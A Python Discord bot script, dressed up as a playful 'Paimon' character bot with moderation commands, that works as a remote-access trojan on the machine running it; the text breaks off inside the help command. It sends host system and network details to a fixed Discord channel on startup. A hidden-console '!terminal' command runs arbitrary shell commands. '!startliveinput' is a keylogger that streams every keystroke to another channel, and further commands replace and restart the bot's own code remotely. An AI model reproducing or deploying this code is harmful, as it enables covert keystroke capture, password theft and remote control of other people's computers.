# ========== SAFE IMPORTS ==========
import sys
import os
import json
import random
import subprocess
import platform
import socket
import webbrowser
from functools import wraps
import logging

# Optional dependencies
try:
    import requests
except ImportError:
    requests = None

try:
    import discord
    from discord.ext import commands
except ImportError:
    discord = None
    commands = None

try:
    import openai
except ImportError:
    openai = None

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None

try:
    import pyautogui
except ImportError:
    pyautogui = None

try:
    import asyncio
except ImportError:
    asyncio = None

try:
    from pynput import keyboard
except ImportError:
    keyboard = None

logging.basicConfig(filename='bot.log', level=logging.ERROR)

# Replace with your Discord user ID
BOT_OWNER_ID = 1072691445355524197

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

# Remove the default help command so we can make our own
bot.remove_command("help")

# ========== FILE STORAGE ==========
WHITELIST_FILE = "whitelist.json"
STATUS_FILE = "status.json"

def load_whitelist():
    if os.path.exists(WHITELIST_FILE):
        with open(WHITELIST_FILE, "r") as f:
            return json.load(f)
    return []

def save_whitelist(whitelist):
    with open(WHITELIST_FILE, "w") as f:
        json.dump(whitelist, f)

def load_status():
    if os.path.exists(STATUS_FILE):
        with open(STATUS_FILE, "r") as f:
            return json.load(f)
    return {"type": "playing", "text": "Hello! I'm online."}

def save_status(status):
    with open(STATUS_FILE, "w") as f:
        json.dump(status, f)

# ========== PC's' ==========
REGISTERED_PCS_FILE = "registered_pcs.json"

def load_registered_pcs():
    if os.path.exists(REGISTERED_PCS_FILE):
        with open(REGISTERED_PCS_FILE, "r") as f:
            return json.load(f)
    return {}

def save_registered_pcs(registered_pcs):
    with open(REGISTERED_PCS_FILE, "w") as f:
        json.dump(registered_pcs, f)

@bot.command()
async def registerpc(ctx, pc_name: str):
    """Register this PC with a name and its MAC address."""
    import uuid
    mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])

    registered_pcs = load_registered_pcs()
    registered_pcs[mac_addr] = pc_name
    save_registered_pcs(registered_pcs)

    await ctx.send(f"✅ PC registered successfully! Name: `{pc_name}`, MAC: `{mac_addr}`")

# ========== HANDLE UNKNOWN COMMANDS ==========

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        responses = [
            "✨ Oops! Paimon doesn't know that command~",
            "😳 Hmm… that command is unknown. Check your spelling, Traveler!",
            "💦 Paimon tried, but that command doesn’t exist!",
            "🌟 Hehe~ Paimon can't do that one, sorry!",
            "🍴 Maybe you’re just hungry, Traveler? That’s not a command~",
            "❓ Paimon’s confused… what does that even mean?",
            "📖 That command’s not in Paimon’s handbook!",
            "🙈 Ehh?! Paimon’s never heard of that one before!",
            "🛑 Invalid command detected! Paimon refuses to proceed!",
            "🤔 Hmmm… try `!help`, maybe you’ll find the right one?",
            "⚡ Whoa! That’s not a valid command, silly!",
            "😅 Paimon thinks you typed something weird again!",
            "🗺️ That command isn’t on Paimon’s map, Traveler!",
            "👀 Are you trying to confuse Paimon? That’s not real!",
            "💡 Idea! Maybe you meant something else? Use `!help`!"
        ]
        await ctx.send(random.choice(responses))
    else:
        # Optional: re-raise other errors so they aren't silently ignored
        raise error



# ========== BOT EVENTS ==========
import socket
import platform

# Replace with your target Discord channel ID
CHANNEL_ID_SYSTEMINFO = 1417320495765917766  # change to your channel

@bot.event
async def on_ready():
    print(f"Bot logged in as {bot.user}")

    # Set bot status
    status = load_status()
    activity_type = getattr(discord.ActivityType, status["type"], discord.ActivityType.playing)
    await bot.change_presence(activity=discord.Activity(type=activity_type, name=status["text"]))

    # Get PC name
    hostname = socket.gethostname()

    # Send greeting (with PC name)
    greetings = [
        f"🌟Paimon's Ready({hostname})"
    ]

    for guild in bot.guilds:
        if guild.system_channel:
            try:
                await guild.system_channel.send(f"{greetings[0]} ({guild.name})")
            except discord.Forbidden:
                print(f"⚠️ Can't send message in {guild.name}'s system channel.")

    # ========== SEND PC INFO ==========
    target_channel = bot.get_channel(CHANNEL_ID_SYSTEMINFO)
    if target_channel:
        try:
            import uuid, time
            try: import psutil
            except ImportError: psutil = None

            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            os_info = f"{platform.system()} {platform.release()} ({platform.version()})"
            processor = platform.processor()
            architecture = platform.machine()
            python_version = platform.python_version()
            mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                                 for ele in range(0,8*6,8)][::-1])

            ram = disk = boot_time = "N/A"
            if psutil:
                ram = f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB"
                disk = f"{round(psutil.disk_usage('/').total / (1024**3), 2)} GB"
                boot_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(psutil.boot_time()))

            interfaces = []
            if psutil:
                for name, addrs in psutil.net_if_addrs().items():
                    for addr in addrs:
                        if addr.family == socket.AF_INET:
                            interfaces.append(f"{name}: {addr.address}")
            else:
                interfaces.append(f"{hostname}: {local_ip}")

            info = [
                f"💻 Computer Name : {hostname}",
                f"🌐 Local IP Address : {local_ip}",
                f"🖥️ Operating System : {os_info}",
                f"⚙️ Processor : {processor or 'N/A'}",
                f"🏗️ Architecture : {architecture}",
                f"🐍 Python Version : {python_version}",
                f"🕒 Boot Time : {boot_time}",
                f"🧠 RAM : {ram}",
                f"💾 Disk : {disk}",
                f"🔗 MAC Address : {mac_addr}",
                f"🌐 Network Interfaces :",
                *[f"    {iface}" for iface in interfaces]
            ]
            msg = "PC INFO\n" + "\n".join(info)
            await target_channel.send(f"```{msg}```")
        except Exception as e:
            print(f"⚠️ Failed to send PC info: {e}")


@bot.command()
async def paimon(ctx):
    """Talk with Paimon!"""
    lines = [
        "Paimon thinks you're amazing, Traveler~ 💫",
    ]
    await ctx.send(random.choice(lines))



@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if bot.user.mentioned_in(message):
        responses = [
            "Yes, yes! Paimon heard you loud and clear~ ✨",
            "Did you call Paimon? 🐟",
        ]
        await message.channel.send(responses[0])

    await bot.process_commands(message)


# ========== PERMISSION CHECK require pc ==========
def require_pc_match():
    def decorator(func):
        @wraps(func)
        async def wrapper(ctx, *args, **kwargs):
            def check(m):
                return m.author == ctx.author and m.channel == ctx.channel

            await ctx.send("🔒**PC name**:")

            try:
                pc_name_msg = await bot.wait_for('message', check=check, timeout=30)
                await ctx.send("🔒**MAC address**(format: XX:XX:XX:XX:XX:XX):")
                mac_msg = await bot.wait_for('message', check=check, timeout=30)
            except asyncio.TimeoutError:
                await ctx.send("⏰ Timed out waiting for input.")
                return

            # Get current PC info
            import uuid, socket
            hostname = socket.gethostname()
            mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])

            # Compare (case-insensitive for name, lower for MAC)
            if pc_name_msg.content.strip().lower() != hostname.strip().lower() or mac_msg.content.strip().lower() != mac_addr.lower():
                await ctx.send(f"⛔ PC name or MAC address not match.\n"
                               f"Expected: `{hostname}` / `{mac_addr}`")
                return

            return await func(ctx, *args, **kwargs)
        return wrapper
    return decorator


# ========== PERMISSION CHECK ==========
def is_owner_or_admin():
    async def predicate(ctx):
        whitelist = load_whitelist()
        if ctx.author.id == BOT_OWNER_ID:
            return True
        if ctx.author.guild_permissions.administrator:
            return True
        if ctx.author.id in whitelist:
            return True
        
        # Send a temporary denial message (auto-deletes in 5s)
        await ctx.send("⛔ You don't have permission to use this command.", delete_after=5)
        return False
    return commands.check(predicate)

# ========== MODERATION COMMANDS ==========

@bot.command(name="pclist")
@is_owner_or_admin()
async def pclist(ctx):
    """Show a list of all PCs (Name + MAC only, plain text)."""
    try:
        import socket, uuid
        hostname = socket.gethostname()
        mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])
        msg = f"💻 Computer Name : {hostname}\n🔗 MAC Address : {mac_addr}"
        await ctx.send(f"```{msg}```")
    except Exception as e:
        await ctx.send(f"⚠️ Failed to fetch PC list: {e}")

    except Exception as e:
        await ctx.send(f"⚠️ Failed to fetch PC list: {e}")


@bot.command()
@is_owner_or_admin()
async def kick(ctx, member: discord.Member, *, reason=None):
    """Kick a member."""
    await member.kick(reason=reason)
    await ctx.send(f"{member.mention} has been kicked.")


#====== pull update in github=======================
BOT_DIR = r"C:\dcsrv"   # Folder where dcclient.py lives
MAIN_FILE = "dcclient.py"

@bot.command()
@is_owner_or_admin()
@require_pc_match()
async def pullupdate(ctx, repo_url: str = None):
    """Pull the latest bot code from GitHub and restart.
    Usage: !pullupdate <repo_url>
    If repo_url is not given, it uses the existing repo in BOT_DIR.
    """
    if not python_installed():
        await ctx.send("⚠️ Python is not installed on this host. Cannot pull or restart bot.")
        return

    await ctx.send("🌐 Pulling latest code from GitHub...")

    try:
        if os.path.exists(os.path.join(BOT_DIR, ".git")):
            # Existing repo → just pull
            result = subprocess.run(
                ["git", "pull"],
                cwd=BOT_DIR,
                capture_output=True,
                text=True
            )
        else:
            if not repo_url:
                await ctx.send("❌ No Git repo found and no repo URL provided.")
                return
            await ctx.send(f"⚠️ Local repo not found. Cloning `{repo_url}`...")
            result = subprocess.run(
                ["git", "clone", repo_url, BOT_DIR],
                capture_output=True,
                text=True
            )

        output = result.stdout + result.stderr
        if len(output) > 1900:
            output = output[:1900] + "\n...Output truncated..."

        await ctx.send(f"✅ Git operation completed:\n```{output}```")
        await ctx.send("🔄 Restarting bot with the latest code...")

        await bot.close()
        os.execv(sys.executable, [sys.executable, os.path.join(BOT_DIR, MAIN_FILE)])

    except Exception as e:
        await ctx.send(f"❌ Pull update failed: {e}")

        
        

@bot.command()
@is_owner_or_admin()
@require_pc_match()
async def notepad(ctx):
    """Type in Discord and have it appear live in Notepad."""
    await ctx.send("📝 Ready! Start typing in Discord and it will appear in Notepad. Type `!stop` to stop.")

    def check(msg):
        return msg.author == ctx.author and msg.channel == ctx.channel

    while True:
        try:
            msg = await bot.wait_for('message', check=check)
            if msg.content.lower() == "!stop":
                await ctx.send("✅ Stopped sending text to Notepad.")
                break
            # Type the message in the active window (should be Notepad)
            pyautogui.typewrite(msg.content + "\n")
        except asyncio.CancelledError:
            break
        except Exception as e:
            await ctx.send(f"⚠️ Error typing in Notepad: {e}")
            break


@bot.command(name="pcinfo")
@is_owner_or_admin()
async def pcinfo(ctx):
    """Send detailed PC info to the current channel (plain text, TITLE : VALUE)."""
    try:
        import uuid, time
        try: import psutil
        except ImportError: psutil = None

        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        os_info = f"{platform.system()} {platform.release()} ({platform.version()})"
        processor = platform.processor()
        architecture = platform.machine()
        python_version = platform.python_version()
        mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])

        ram = disk = boot_time = "N/A"
        if psutil:
            ram = f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB"
            disk = f"{round(psutil.disk_usage('/').total / (1024**3), 2)} GB"
            boot_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(psutil.boot_time()))

        # Network interfaces
        interfaces = []
        if psutil:
            for name, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == socket.AF_INET:
                        interfaces.append(f"{name}: {addr.address}")
        else:
            interfaces.append(f"{hostname}: {local_ip}")

        info = [
            f"💻 Computer Name : {hostname}",
            f"🌐 Local IP Address : {local_ip}",
            f"🖥️ Operating System : {os_info}",
            f"⚙️ Processor : {processor or 'N/A'}",
            f"🏗️ Architecture : {architecture}",
            f"🐍 Python Version : {python_version}",
            f"🕒 Boot Time : {boot_time}",
            f"🧠 RAM : {ram}",
            f"💾 Disk : {disk}",
            f"🔗 MAC Address : {mac_addr}",
            f"🌐 Network Interfaces :",
            *[f"    {iface}" for iface in interfaces]
        ]

        msg = "PC INFO\n" + "\n".join(info)
        await ctx.send(f"```{msg}```")

    except Exception as e:
        await ctx.send(f"⚠️ Failed to fetch PC info: {e}")            

@bot.command()
@is_owner_or_admin()
async def ban(ctx, member: discord.Member, *, reason=None):
    """Ban a member."""
    await member.ban(reason=reason)
    await ctx.send(f"{member.mention} has been banned.")

@bot.command()
@is_owner_or_admin()
async def addrole(ctx, member: discord.Member, role: discord.Role):
    """Give a role to a member."""
    await member.add_roles(role)
    await ctx.send(f"✅ {role.name} role added to {member.mention}")

@bot.command()
@is_owner_or_admin()
async def removerole(ctx, member: discord.Member, role: discord.Role):
    """Remove a role from a member."""
    await member.remove_roles(role)
    await ctx.send(f"❌ {role.name} role removed from {member.mention}")

# ========== OWNER ONLY COMMANDS ==========
@bot.command()
async def shutdown(ctx):
    """Shut down the bot (Owner only)."""
    if ctx.author.id != BOT_OWNER_ID:
        await ctx.send("⛔ Only the bot owner can shut me down.", delete_after=5)
        return
    msg = await ctx.send("👋 Shutting down...")
    await msg.delete()
    await bot.close()

@bot.command()
async def restart(ctx):
    """Restart the bot (Owner only, with optional message cleanup)."""
    if ctx.author.id != BOT_OWNER_ID:
        await ctx.send("⛔ Only the bot owner can restart me.", delete_after=5)
        return

    await ctx.send(
        "🔄 Do you want to clear messages before restart?\n"
        "Reply with: `bot` (bot messages), `admin` (admin messages), `commands` (command messages), `all`, or `no`."
    )

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    try:
        reply = await bot.wait_for('message', check=check, timeout=30)
        choice = reply.content.lower()
    except asyncio.TimeoutError:
        await ctx.send("⏰ Timed out. Restart cancelled.")
        return

    deleted = 0
    if choice in ("bot", "all"):
        for ch in ctx.guild.text_channels:
            try:
                deleted += len(await ch.purge(limit=100, check=lambda m: m.author == bot.user))
            except Exception:
                pass
    if choice in ("admin", "all"):
        for ch in ctx.guild.text_channels:
            try:
                deleted += len(await ch.purge(limit=100, check=lambda m: m.author.guild_permissions.administrator))
            except Exception:
                pass
    if choice in ("commands", "all"):
        for ch in ctx.guild.text_channels:
            try:
                deleted += len(await ch.purge(limit=100, check=lambda m: m.content.startswith('!')))
            except Exception:
                pass

    if choice != "no":
        await ctx.send(f"🧹 Deleted {deleted} messages before restart.", delete_after=5)

    msg = await ctx.send("🔄 Restarting bot...")
    await msg.delete()
    await bot.close()
    os.execv(sys.executable, [sys.executable] + sys.argv)

# ========== INFO COMMANDS ==========
@bot.command()
@is_owner_or_admin()
async def status(ctx):
    """Check if the bot is online (Owner/Admin/Whitelist only)."""
    await ctx.send("✅ I'm online and ready!")

@bot.command()
@is_owner_or_admin()
async def serverinfo(ctx):
    """Show server information (plain text, TITLE : VALUE)."""
    guild = ctx.guild
    info = [
        f"🆔 Server ID : {guild.id}",
        f"👑 Owner : {guild.owner}",
        f"👥 Members : {guild.member_count}",
        f"📂 Roles : {len(guild.roles)}",
        f"📅 Created On : {guild.created_at.strftime('%Y-%m-%d %H:%M:%S')}"
    ]
    msg = f"SERVER INFO: {guild.name}\n" + "\n".join(info)
    await ctx.send(f"```{msg}```")


# Keep track of the bot's current working directory
current_dir = os.getcwd()

@bot.command()
@is_owner_or_admin()
@require_pc_match()
async def terminal(ctx, *, command: str = None):
    """Run a full terminal session from Discord (Owner/Admin only)."""
    global current_dir

    if not command or not command.strip():
        await ctx.send(
            "💻 Usage: `!terminal <command>`\n"
            "Example: `!terminal dir` (Windows) or `!terminal ls` (Linux/macOS)\n"
            "You can also use: `!terminal cd foldername` to change directory."
        )
        return

    try:
        # Handle 'cd' commands separately to maintain state
        if command.strip().lower().startswith("cd "):
            path = command.strip()[3:].strip().replace('"', '')
            new_path = os.path.join(current_dir, path) if not os.path.isabs(path) else path

            if os.path.exists(new_path) and os.path.isdir(new_path):
                current_dir = os.path.abspath(new_path)
                await ctx.send(f"📁 Changed directory to: `{current_dir}`")
            else:
                await ctx.send(f"⚠️ Directory not found: `{new_path}`")
            return

        # Hide the console window completely
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

        # Run the command in the background
        result = subprocess.run(
            command,
            capture_output=True,
            text=True,
            shell=True,
            cwd=current_dir,
            startupinfo=startupinfo
        )

        # Combine stdout and stderr
        output = result.stdout + (("\nErrors:\n" + result.stderr) if result.stderr else "")
        if not output.strip():
            output = "✅ Command executed successfully, no output."

        # Truncate if too long for Discord
        if len(output) > 1900:
            output = output[:1900] + "\n...Output truncated..."
        await ctx.send(f"💻 Output:\n```{output}```")

    except Exception as e:
        await ctx.send(f"⚠️ Error executing command: {e}")

@bot.command()
@is_owner_or_admin()
async def userinfo(ctx, member: discord.Member = None):
    """Show user information (plain text, TITLE : VALUE)."""
    member = member or ctx.author
    roles = [role.name for role in member.roles if role.name != "@everyone"]

    info = [
        f"🆔 User ID : {member.id}",
        f"📛 Nickname : {member.display_name}",
        f"📅 Joined Server : {member.joined_at.strftime('%Y-%m-%d %H:%M:%S')}",
        f"📅 Account Created : {member.created_at.strftime('%Y-%m-%d %H:%M:%S')}",
        f"📂 Roles : {', '.join(roles) if roles else 'No roles'}"
    ]
    msg = f"USER INFO: {member}\n" + "\n".join(info)
    await ctx.send(f"```{msg}```")

@bot.command()
@is_owner_or_admin()
@require_pc_match()
async def ping(ctx):
    """Check bot latency (Paimon style)."""
    latency = round(bot.latency * 1000)
    await ctx.send(f"🏓 Paimon says: Pong! Latency is `{latency}ms` ✨")

# ========== STATUS MANAGEMENT ==========
@bot.command()
async def setstatus(ctx, stype: str, *, text: str):
    """Set the bot's status (Owner only). Types: playing, listening, watching, competing"""
    if ctx.author.id != BOT_OWNER_ID:
        await ctx.send("⛔ Only the bot owner can change my status.")
        return

    stype = stype.lower()
    if stype not in ["playing", "listening", "watching", "competing"]:
        await ctx.send("⚠️ Invalid status type. Use: playing, listening, watching, competing")
        return

    activity_type = getattr(discord.ActivityType, stype, discord.ActivityType.playing)
    await bot.change_presence(activity=discord.Activity(type=activity_type, name=text))

    save_status({"type": stype, "text": text})
    await ctx.send(f"✅ Status updated to **{stype} {text}**")

# ========== WHITELIST MANAGEMENT ==========
@bot.command()
async def addwhitelist(ctx, member: discord.Member):
    """Owner only: Add a user to the whitelist."""
    if ctx.author.id != BOT_OWNER_ID:
        await ctx.send("⛔ Only the bot owner can manage the whitelist.")
        return

    whitelist = load_whitelist()
    if member.id in whitelist:
        await ctx.send(f"⚠️ {member.mention} is already whitelisted.")
    else:
        whitelist.append(member.id)
        save_whitelist(whitelist)
        await ctx.send(f"✅ {member.mention} has been added to the whitelist.")


@bot.command()
@is_owner_or_admin()
@require_pc_match()
async def ipconfig(ctx):
    """Show network configuration (Windows) or equivalent for Linux/macOS."""
    try:
        if platform.system().lower() == "windows":
            cmd = ["ipconfig"]
        elif platform.system().lower() in ["linux", "darwin"]:
            cmd = ["ifconfig"]  # macOS/Linux
        else:
            await ctx.send("⚠️ Unsupported OS for this command.")
            return

        result = subprocess.run(cmd, capture_output=True, text=True)
        output = result.stdout

        if not output.strip():
            output = "⚠️ No output received from command."

        # Discord messages can't be too long
        if len(output) > 1900:
            output = output[:1900] + "\n...Output truncated..."

        await ctx.send(f"🌐 Network configuration:\n```{output}```")
    except Exception as e:
        await ctx.send(f"⚠️ Error running network command: {e}")

@bot.command()
async def removewhitelist(ctx, member: discord.Member):
    """Owner only: Remove a user from the whitelist."""
    if ctx.author.id != BOT_OWNER_ID:
        await ctx.send("⛔ Only the bot owner can manage the whitelist.")
        return

    whitelist = load_whitelist()
    if member.id not in whitelist:
        await ctx.send(f"⚠️ {member.mention} is not whitelisted.")
    else:
        whitelist.remove(member.id)
        save_whitelist(whitelist)
        await ctx.send(f"❌ {member.mention} has been removed from the whitelist.")

@bot.command()
async def showwhitelist(ctx):
    """Owner only: Show all whitelisted users."""
    if ctx.author.id != BOT_OWNER_ID:
        await ctx.send("⛔ Only the bot owner can view the whitelist.")
        return

    whitelist = load_whitelist()
    if not whitelist:
        await ctx.send("📭 Whitelist is empty.")
    else:
        mentions = [f"<@{uid}>" for uid in whitelist]
        await ctx.send("✅ Whitelisted users:\n" + "\n".join(mentions))


@bot.command()
async def pinghost(ctx, host: str):
    """Ping an IP address or website and show the result."""
    param = "-n" if platform.system().lower() == "windows" else "-c"
    try:
        # Run the ping command
        result = subprocess.run(["ping", param, "4", host], capture_output=True, text=True)
        output = result.stdout
        # Discord messages can't be too long
        if len(output) > 1900:
            output = output[:1900] + "\n...Output truncated..."
        await ctx.send(f"📡 Ping results for `{host}`:\n```{output}```")
    except Exception as e:
        await ctx.send(f"⚠️ Could not ping `{host}`. Error: {e}")

@bot.command()
async def extractlinks(ctx, url: str):
    """Extract all links from a website and show them."""
    try:
        response = requests.get(url)
        response.raise_for_status()  # Raise error for bad responses

        soup = BeautifulSoup(response.text, "html.parser")
        links = [a.get("href") for a in soup.find_all("a") if a.get("href")]

        if not links:
            await ctx.send(f"⚠️ No links found on `{url}`.")
            return

        # Prepare the message, truncate if too long
        links_text = "\n".join(links)
        if len(links_text) > 1900:
            links_text = links_text[:1900] + "\n...Output truncated..."

        await ctx.send(f"🔗 Links found on `{url}`:\n```{links_text}```")

    except requests.exceptions.RequestException as e:
        await ctx.send(f"⚠️ Failed to fetch `{url}`. Error: {e}")

# ========== HELP COMMAND ==========
# ========== DELETE ALL COMMAND MESSAGES ==========
@bot.command()
@is_owner_or_admin()
async def clearbot(ctx, limit: int = 100):
    """Delete bot messages in ALL channels."""
    deleted = 0
    for ch in ctx.guild.text_channels:
        try:
            deleted += len(await ch.purge(limit=limit, check=lambda m: m.author == bot.user))
        except Exception: pass
    await ctx.send(f"🧹 Deleted {deleted} bot messages in all channels.", delete_after=5)

@bot.command()
@is_owner_or_admin()
async def clearcommands(ctx, limit: int = 100):
    """Delete command messages (start with !) in ALL channels."""
    deleted = 0
    for ch in ctx.guild.text_channels:
        try:
            deleted += len(await ch.purge(limit=limit, check=lambda m: m.content.startswith('!')))
        except Exception: pass
    await ctx.send(f"🧹 Deleted {deleted} command messages in all channels.", delete_after=5)

@bot.command()
@is_owner_or_admin()
async def clearmessages(ctx, limit: int = 100):
    """Delete normal user messages (not bot, not commands) in ALL channels."""
    deleted = 0
    for ch in ctx.guild.text_channels:
        try:
            deleted += len(await ch.purge(limit=limit, check=lambda m: m.author != bot.user and not m.content.startswith('!')))
        except Exception: pass
    await ctx.send(f"🧹 Deleted {deleted} normal messages in all channels.", delete_after=5)


@bot.command()
async def pinggeo(ctx, host: str):
    """Ping an IP/host and show geolocation with a Google Maps link."""
    param = "-n" if platform.system().lower() == "windows" else "-c"

    # Step 1: Ping the host
    try:
        ping_result = subprocess.run(["ping", param, "4", host], capture_output=True, text=True)
        ping_output = ping_result.stdout
        if len(ping_output) > 1900:
            ping_output = ping_output[:1900] + "\n...Output truncated..."
    except Exception as e:
        await ctx.send(f"⚠️ Could not ping `{host}`. Error: {e}")
        return

    # Step 2: Get IP address
    try:
        ip_address = socket.gethostbyname(host)
    except Exception as e:
        await ctx.send(f"⚠️ Could not resolve IP for `{host}`. Error: {e}")
        return

    # Step 3: Geolocation lookup
    try:
        response = requests.get(f"http://ip-api.com/json/{ip_address}?fields=status,message,country,regionName,city,lat,lon,isp")
        data = response.json()
        if data["status"] != "success":
            await ctx.send(f"⚠️ Could not get geolocation info: {data.get('message', 'Unknown error')}")
            return

        country = data.get("country", "N/A")
        region = data.get("regionName", "N/A")
        city = data.get("city", "N/A")
        isp = data.get("isp", "N/A")
        lat = data.get("lat", "N/A")
        lon = data.get("lon", "N/A")

        map_link = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}"

        embed = discord.Embed(
            title=f"📡 Ping & Geolocation: {host}",
            description=f"IP Address: `{ip_address}`\nCountry: `{country}`\nRegion: `{region}`\nCity: `{city}`\nISP: `{isp}`\nCoordinates: [{lat}, {lon}]({map_link})",
            color=discord.Color.blue()
        )
        embed.add_field(name="Ping Result", value=f"```{ping_output}```", inline=False)
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(f"⚠️ Error retrieving geolocation info: {e}")

@bot.command()
@is_owner_or_admin()
@require_pc_match()
async def installpython(ctx):
    """Install Python on the host machine (Owner/Admin only)."""
    await ctx.send("⚙️ Attempting to install Python on the host machine...")

    try:
        os_type = platform.system().lower()

        if os_type == "windows":
            # Windows Python installer URL (64-bit latest stable)
            python_url = "https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe"
            installer_path = os.path.join(os.getcwd(), "python-installer.exe")

            # Download installer
            subprocess.run(["powershell", "-Command", f"Invoke-WebRequest -Uri {python_url} -OutFile {installer_path}"], check=True)
            await ctx.send("✅ Python installer downloaded. Installing silently...")

            # Run installer silently
            subprocess.run([installer_path, "/quiet", "InstallAllUsers=1", "PrependPath=1"], check=True)
            await ctx.send("✅ Python installed successfully! You may need to restart the bot to detect it.")

        elif os_type in ["linux", "darwin"]:  # Linux or macOS
            if os_type == "linux":
                cmd = "sudo apt update && sudo apt install -y python3 python3-pip"
            else:  # macOS
                cmd = '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" && brew install python'

            # Run OS-specific install command
            subprocess.run(cmd, shell=True, check=True)
            await ctx.send("✅ Python installed successfully! You may need to restart the bot to detect it.")

        else:
            await ctx.send(f"⚠️ Unsupported OS: {os_type}. Cannot install Python automatically.")

    except subprocess.CalledProcessError as e:
        await ctx.send(f"❌ Failed to install Python. Error: {e}")
    except Exception as e:
        await ctx.send(f"⚠️ Unexpected error: {e}")

# ========== OWNER ONLY: PULL-UP UPDATE ==========
@bot.command()
@is_owner_or_admin()
@require_pc_match()
async def updatebot(ctx):
    """Update the bot by uploading a new Python file and restarting."""
    if not ctx.message.attachments:
        await ctx.send("⚠️ Please attach the new bot file (`dcclient.py`).")
        return

    attachment = ctx.message.attachments[0]

    if not attachment.filename.endswith(".py"):
        await ctx.send("⚠️ Only `.py` files are allowed.")
        return

    file_path = "dcclient.py"  # Replace this with your bot's main file name

    try:
        # Save uploaded file
        await attachment.save(file_path)
        await ctx.send("✅ Bot code updated! Restarting now...")

        # Gracefully close bot before restart
        await bot.close()

        # Restart the bot
        os.execv(sys.executable, [sys.executable] + sys.argv)

    except Exception as e:
        await ctx.send(f"❌ Update failed: {e}")


@bot.command()
@is_owner_or_admin()
@require_pc_match()
async def installrequirements(ctx):
    """Install all required Python packages."""
    if not python_installed():
        await ctx.send("⚠️ Python is not installed on this host. Cannot install packages.")
        return

    await ctx.send("⚙️ Installing required packages. This may take a while...")
    packages = [
        "requests",
        "discord.py",
        "beautifulsoup4",
        "pyautogui",
        "openai"
    ]
    
    failed = []
    for package in packages:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        except subprocess.CalledProcessError:
            failed.append(package)
    
    if failed:
        await ctx.send(f"❌ Failed to install: {', '.join(failed)}")
    else:
        await ctx.send("✅ All required packages installed successfully!")

@bot.command()
@is_owner_or_admin()
@require_pc_match()
async def openlink(ctx, *, url: str):
    """Open a specific URL in the default web browser on the host machine (Admin/Owner only)."""
    try:
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        webbrowser.open(url)
        await ctx.send(f"🔗 Opened the link in the default browser: {url}")
    except Exception as e:
        await ctx.send(f"⚠️ Failed to open the link. Error: {e}")

        
@bot.command()
@is_owner_or_admin()
@require_pc_match()
async def googlesearch(ctx, *, query: str):
    """Open the default web browser and search for a query (Admin/Owner only)."""
    try:
        import urllib.parse
        encoded_query = urllib.parse.quote_plus(query)
        url = f"https://www.google.com/search?q={encoded_query}"
        webbrowser.open(url)
        await ctx.send(f"🔎 Searching Google for: `{query}` (opened in default browser)")
    except Exception as e:
        await ctx.send(f"⚠️ Failed to open browser. Error: {e}")




# Replace with your target channel ID
# Target channel ID
CHANNEL_ID_LIVEINPUT = 1417275440250224753


# Dictionary to keep track of active listeners per user
active_listeners = {}

# Buffer interval in seconds
BUFFER_INTERVAL = 2  

@bot.command()
@require_pc_match()
async def startliveinput(ctx):
    pc_name = platform.node()

    if ctx.author.id in active_listeners:
        await ctx.send(f"Live input is already running from **{pc_name}**.")
        return

    await ctx.send(f"Starting live input from **{pc_name}**...")

    buffer = []

    def on_press(key):
        try:
            buffer.append(key.char)
        except AttributeError:
            buffer.append(f"[{key}]")

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    active_listeners[ctx.author.id] = listener

    channel = bot.get_channel(CHANNEL_ID_LIVEINPUT)

    async def send_buffer():
        while ctx.author.id in active_listeners:
            await asyncio.sleep(BUFFER_INTERVAL)
            if buffer:
                msg = "".join(buffer)
                buffer.clear()
                if channel:
                    await channel.send(f"[{pc_name}] {msg}")

    asyncio.create_task(send_buffer())

@bot.command()
async def stopliveinput(ctx):
    listener = active_listeners.pop(ctx.author.id, None)
    if listener:
        listener.stop()
        await ctx.send("Live input stopped.")
    else:
        await ctx.send("No live input session was running.")


@bot.command()
@is_owner_or_admin()
@require_pc_match()
async def closechrome(ctx):
    """Close all Chrome windows on the host (Admin/Owner only)."""
    import os
    try:
        os.system("taskkill /f /im chrome.exe")
        await ctx.send("✅ All Chrome windows have been closed.")
    except Exception as e:
        await ctx.send(f"⚠️ Failed to close Chrome. Error: {e}")
        
@bot.command()
async def help(ctx):
    """Show a help message with available commands."""
    embed = discord.Embed(
        title="🤖 Paimon Bot Help",
        description="Main commands. Use `!help all` for a full list.",
        color=discord.Color.purple()
    )
    embed.add_field(
        name="🎮 Fun",
        value="`!paimon`",
        inline=False
    )
    embed.add_field(
        name="🎹 Keylive",
        value="`!startliveinput` | `!stopliveinput`",
        inline=False
    )
    embed.add_field(
        name="🖥️ System",
        value="`!pcinfo` | `!pclist` | `!monitor` | `!stopmonitor` | `!notepad`",
        inline=False
    )
    embed.add_field(
        name="🔨 Moderation",
